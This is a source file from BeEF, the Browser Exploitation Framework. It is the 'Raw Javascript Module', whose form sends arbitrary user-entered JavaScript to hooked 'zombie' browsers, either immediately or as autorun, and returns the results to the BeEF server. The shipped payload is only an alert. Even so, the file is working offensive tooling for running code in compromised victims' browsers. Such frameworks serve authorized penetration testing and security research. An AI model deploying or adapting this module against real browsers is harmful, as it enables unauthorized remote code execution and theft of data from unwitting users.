<?php
	// Copyright (c) 2006-2009, Wade Alcorn 
	// All Rights Reserved
	// wade@bindshell.net - http://www.bindshell.net
	// beef.20.alfa@spamgourmet.com

	require_once("../../../include/common.inc.php"); // included for get_b64_file()
	DEFINE('JS_FILE', './template.js');
?>
<script>

	function get_b64_code_rj() {
		// javascript is loaded from a file - it could be hard coded
		var b64code = '<? echo get_b64_file(JS_FILE); ?>';
		
		// replace sections of the code with user input
		b64code = b64replace(b64code, "REGEXP", document.cmd_form.regexp.value);
		b64code = b64replace(b64code, "CMD", document.cmd_form.cmd.value);
		
		return b64code;
	}

	Element.Methods.set_autorun = function() {
		ar.enable('Raw Javascript Module', get_b64_code_rj());
	}
	
	Element.Methods.send_now = function() {
		do_send(get_b64_code_rj());
	}

	// add functions to DOM
	Element.addMethods();

</script>

<!-- PAGE CONTENT -->
<div id="module_header">Raw Javascript Module</div>
This module will send the code entered in the 'JavaScript Code' section to the selected
zombie browsers where it will be executed.<br><br> 

The return_result() will send its string parameter back to the BeEF server.<br><br>

<div id="module_subsection">
	<form name="cmd_form">
		<div id="module_subsection_header">UserAgent Regexp</div>
		<input type="text" name="regexp" value="/.*/"/>
		<div id="module_subsection_header">JavaScript Code</div>
		<textarea name="cmd" rows="5" cols="80">alert('BeEF Raw Javascript Module');
var my_return_value = "result data";
return_result(result_id,  my_return_value); // BeEF related function
		</textarea>
		<input class="button" type="button" value=" Set Autorun " onClick="javascript:set_autorun()"/>
		<input class="button" type="button" value=" Send Now " onClick="javascript:send_now()"/>		
	</form>
</div>

